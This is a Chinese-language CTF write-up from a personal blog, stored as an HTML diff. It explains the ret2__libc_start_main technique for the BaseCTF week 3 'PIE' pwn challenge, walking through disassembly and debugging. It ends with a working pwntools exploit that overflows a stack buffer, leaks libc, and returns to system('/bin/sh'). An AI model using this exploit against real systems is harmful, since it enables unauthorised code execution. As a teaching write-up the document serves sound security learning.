@@ -1,0 +1,368 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  <meta name="baidu-site-verification" content="codeva-0Qx7wvY9gP" />
+  
+  <title>记一次简单的ret2libc_start_main分析及利用 | C_LBY&#39;s BLOG</title>
+  <meta name="author" content="鎏柏鱼">
+  
+  <meta name="description" content="BaseCTF week3 PWN PIE">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="记一次简单的ret2libc_start_main分析及利用"/>
+  <meta property="og:site_name" content="C_LBY&#39;s BLOG"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="C_LBY&#39;s BLOG" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">C_LBY&#39;s BLOG</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/diary" title="fashion little junk">
+			  <i class="fa fa-tasks"></i>Diary
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 记一次简单的ret2libc_start_main分析及利用</h1>
+		</div>
+	
+
+
+
+	<div class="row post">
+		<!-- cols -->
+		
+			<div id="top_meta"></div>
+			<div class="col-md-9">
+				
+
+							<!-- content -->
+							<div class="mypage">
+								
+									<div class="alert alert-success description">
+										<i class="fa fa-info-circle"></i> BaseCTF week3 PWN PIE
+									</div> <!-- alert -->
+									
+
+										<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ol>
+<li><p>PIE的概念</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://wiki.mrskye.cn/Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_1">有关__libc_start_main的文章</a></p>
+</li>
+</ol>
+<p>不过其实就算没看懂这篇文章问题也不大，只要是题目做多了的话都能知道一点就是，正常gcc编译出来的elf程序都会经历一个<code>_start</code>和<code>__libc_start_main</code>的过程。</p>
+<p>这个阶段在程序里体现为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000010A0                 public _start</span><br><span class="line">.text:00000000000010A0 _start          proc near               ; DATA XREF: LOAD:0000000000000018↑o</span><br><span class="line">.text:00000000000010A0 ; __unwind &#123;</span><br><span class="line">.text:00000000000010A0                 endbr64</span><br><span class="line">.text:00000000000010A4                 xor     ebp, ebp</span><br><span class="line">.text:00000000000010A6                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000000010A9                 pop     rsi             ; argc</span><br><span class="line">.text:00000000000010AA                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000000010AD                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000000010B1                 push    rax</span><br><span class="line">.text:00000000000010B2                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000000010B3                 xor     r8d, r8d        ; fini</span><br><span class="line">.text:00000000000010B6                 xor     ecx, ecx        ; init</span><br><span class="line">.text:00000000000010B8                 lea     rdi, main       ; main</span><br><span class="line">.text:00000000000010BF                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:00000000000010C5                 hlt</span><br><span class="line">.text:00000000000010C5 ; &#125; // starts at 10A0</span><br><span class="line">.text:00000000000010C5 _start          endp</span><br></pre></td></tr></table></figure>
+
+<p>这段部分如果翻源码可以发现其实是直接用汇编写的。我们只需要关注一个点，<strong>执行__libc_start_main的时候rdi寄存器里存的是main的地址</strong>。</p>
+<p>紧接着我们来看看<code>__libc_start_main</code>，但是这个程序很长，我们只关注部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000029E33 loc_29E33:                              ; CODE XREF: __libc_start_main+124↓j</span><br><span class="line">.text:0000000000029E33                 mov     rdx, r12</span><br><span class="line">.text:0000000000029E36                 mov     esi, ebp</span><br><span class="line">.text:0000000000029E38                 mov     rdi, r13</span><br><span class="line">.text:0000000000029E3B                 call    sub_29D10</span><br></pre></td></tr></table></figure>
+
+<p>call了一个函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000029D10 ; void __fastcall __noreturn sub_29D10(unsigned int (__fastcall *)(_QWORD, __int64, char **), unsigned int, __int64)</span><br><span class="line">.text:0000000000029D10 sub_29D10       proc near               ; CODE XREF: __libc_start_main+7B↓p</span><br><span class="line">.text:0000000000029D10</span><br><span class="line">.text:0000000000029D10 var_90          = qword ptr -90h</span><br><span class="line">.text:0000000000029D10 var_84          = dword ptr -84h</span><br><span class="line">.text:0000000000029D10 var_80          = qword ptr -80h</span><br><span class="line">.text:0000000000029D10 var_78          = byte ptr -78h</span><br><span class="line">.text:0000000000029D10 var_30          = qword ptr -30h</span><br><span class="line">.text:0000000000029D10 var_28          = qword ptr -28h</span><br><span class="line">.text:0000000000029D10 var_10          = qword ptr -10h</span><br><span class="line">.text:0000000000029D10</span><br><span class="line">.text:0000000000029D10 ; __unwind &#123;</span><br><span class="line">.text:0000000000029D10                 push    rax</span><br><span class="line">.text:0000000000029D11                 pop     rax</span><br><span class="line">.text:0000000000029D12                 sub     rsp, 98h</span><br><span class="line">.text:0000000000029D19                 mov     [rsp+98h+var_90], rdi  &lt;-- 1</span><br><span class="line">.text:0000000000029D1E                 lea     rdi, [rsp+98h+var_78] ; env</span><br><span class="line">.text:0000000000029D23                 mov     [rsp+98h+var_84], esi</span><br><span class="line">.text:0000000000029D27                 mov     [rsp+98h+var_80], rdx</span><br><span class="line">.text:0000000000029D2C                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000029D35                 mov     [rsp+98h+var_10], rax</span><br><span class="line">.text:0000000000029D3D                 xor     eax, eax</span><br><span class="line">.text:0000000000029D3F                 call    _setjmp</span><br><span class="line">.text:0000000000029D44                 endbr64</span><br><span class="line">.text:0000000000029D48                 test    eax, eax</span><br><span class="line">.text:0000000000029D4A                 jnz     short loc_29D97</span><br><span class="line">.text:0000000000029D4C                 mov     rax, fs:300h</span><br><span class="line">.text:0000000000029D55                 mov     [rsp+98h+var_30], rax</span><br><span class="line">.text:0000000000029D5A                 mov     rax, fs:2F8h</span><br><span class="line">.text:0000000000029D63                 mov     [rsp+98h+var_28], rax</span><br><span class="line">.text:0000000000029D68                 lea     rax, [rsp+98h+var_78]</span><br><span class="line">.text:0000000000029D6D                 mov     fs:300h, rax</span><br><span class="line">.text:0000000000029D76                 mov     rax, cs:environ_ptr</span><br><span class="line">.text:0000000000029D7D                 mov     edi, [rsp+98h+var_84]</span><br><span class="line">.text:0000000000029D81                 mov     rsi, [rsp+98h+var_80]</span><br><span class="line">.text:0000000000029D86                 mov     rdx, [rax]</span><br><span class="line">.text:0000000000029D89                 mov     rax, [rsp+98h+var_90]  &lt;-- 2</span><br><span class="line">.text:0000000000029D8E                 call    rax  &lt;-- 3</span><br><span class="line">.text:0000000000029D90                 mov     edi, eax</span><br><span class="line">.text:0000000000029D92</span><br><span class="line">.text:0000000000029D92 loc_29D92:                              ; CODE XREF: sub_29D10+AA↓j</span><br><span class="line">.text:0000000000029D92                 call    exit</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>其实这个函数就是pwndbg里显示的<code>__libc_start_call_main</code>。关注标注出来的几行可以发现rdi最后是被传入rax后被call了，才正式进入了main函数开始执行程序流程。换个角度来看，main函数的返回地址就是<code>mov edi,eax</code>那一行，紧接着就exit了。</p>
+<h3 id="BaseCTF-week3-PIE题目分析"><a href="#BaseCTF-week3-PIE题目分析" class="headerlink" title="BaseCTF week3  PIE题目分析"></a>BaseCTF week3  PIE题目分析</h3><p>题目其实非常简单，也很简短。开了PIE保护。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you said %s&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个溢出，一次打印。问题在于这题既没有后门，也没有说把溢出放在一个子函数里，而是放在了main函数，那就导致了其返回地址是一个libc地址，没法直接部分写返回main。因为只有一次机会，没法做到同时泄露地址又写进去一个地址，所以也只有可能用部分写了。所以考虑用<code>ret2__libc_start_main</code>来重启main函数。</p>
+<p>一开始调试看到返回地址是<code>__libc_start_call_main+128</code>（0x29D90），所以就想着我要不直接把那个地址减去108，然后填回去（0x29D10），刚好只有最后一个字节改变了。但是发现打不通，最后会卡在movaps。然后尝试绕过第一个push指令，还是不行，rax是非法地址。</p>
+<p>然后尝试填<code>__libc_start_main</code>的首地址（0x29DC0），依然是上面两个问题。所以我就打开libc文件来看汇编了，发现<code>__libc_start_call_main</code>这个函数前半部分基本上都是在进行寄存器状态的保存。后面尝试了几次发现最后一个字节从1e到89都是可以用来打通的。所以开始找原因，于是就有了上面前置知识那样的分析。</p>
+<p>其实最大的问题也就发生在那个rdi身上，如果他存着main的函数地址，那么main是可以被正常启动的。但是很显然程序不会无缘无故把main函数存到rdi里。所以如果跳过保存rdi到栈上那一步就能够正常运行了。</p>
+<p>能正常运行意味着，栈上对应位置确实存着main的函数地址，这是怎么回事呢？我们动调看看。</p>
+<p><img src="https://c-lby.top/images/ret2libc_start_main/%E6%A0%88%E8%BF%98%E5%8E%9F.png" alt="栈还原"></p>
+<p>程序从rsp+8处取main地址，栈刚好满足。这是因为main函数执行之前就存在过__libc_start_main函数的栈帧，而main函数正常返回也会回到这个栈帧里来。换句话说，只要我在之前的操作中没有破坏到这个地方，那么函数就能正常从栈中取到main地址，从而实现重启main函数。</p>
+<p>那这道题下面就很简单，因为可以实现重启main，那我们就可以利用第一次printf覆盖\x00带出libc地址，然后获取libc基址，第二次回到main函数的时候再ROP执行binsh即可。</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;challenge.basectf.fun&#x27;, 35787)</span></span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># e = ELF(&#x27;./vuln&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+<span class="string">b&#x27;\x1e&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *$rebase(0x123e)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x29d1e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">rdi = libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret = libc_base+<span class="number">0x29139</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+											<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0
+        国际许可协议(CC BY-NC-SA 4.0) 发布.</a></br>
+    因本人技术水平和知识面有限, 内容如有纰漏或者需要修正的地方, 欢迎大家指正。转载请注明来自<a href="https://c-lby.github.io" target="_blank">C_LBY's blog</a>！
+</div>
+							</div>
+
+							
+									
+										<span data-path="/2024/ret2libc-start-main/">
+											<em class="post-meta-item-text"> Page View <i
+													class="waline-pageview-count"></i></em>
+										</span>
+
+										
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+    
+    <a href="/2024/2024ycb-wp/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/cpp-exception/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+											
+													
+														<section id="comments" class="comments">
+															<!-- <link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
+<div id="waline"></div>
+<script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+  var walineConfig = 
+    walineConfig.el='#waline';
+  Waline.init(walineConfig);
+</script> -->
+
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
+<div id="waline"></div>
+<script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+
+  init({
+    enable: true,
+    el: '#waline',
+    serverURL: 'https://blog-s-comment-three.vercel.app',
+    dark: true,
+    pageview: true,
+    lang: 'zh-CN',
+    requiredMeta: ['nick', 'mail'],
+    locale:
+      { placeholder: 'Say something……' },
+    highlighter: true,
+    search: false,
+    emoji: [
+      '//unpkg.com/@waline/emojis@1.2.0/weibo',
+      '//unpkg.com/@waline/emojis@1.2.0/bmoji',
+      '//unpkg.com/@waline/emojis@1.2.0/bilibili',
+      'https://unpkg.com/@waline/emojis@1.2.0/qq',
+    ],
+    imageUploader: false,
+  });
+</script>
+														</section>
+														
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+					
+						<div id="side_meta">
+							<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-09-01 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/ret2-libc-start-main/">ret2__libc_start_main<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>25</span></a></li> <li><a href="/tags/PWN/">PWN<span>29</span></a></li> <li><a href="/tags/ROP/">ROP<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-article-text">前置知识</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#BaseCTF-week3-PIE%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-article-text">BaseCTF week3  PIE题目分析</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#EXP"><span class="toc-article-text">EXP</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+
+
+						</div>
+
+						
+
+			</div><!-- row -->
+
+			<!--
+ -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+    &copy; 2024
+      鎏柏鱼's Blog
+        
+                powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by <a
+                  href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>
+</p> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
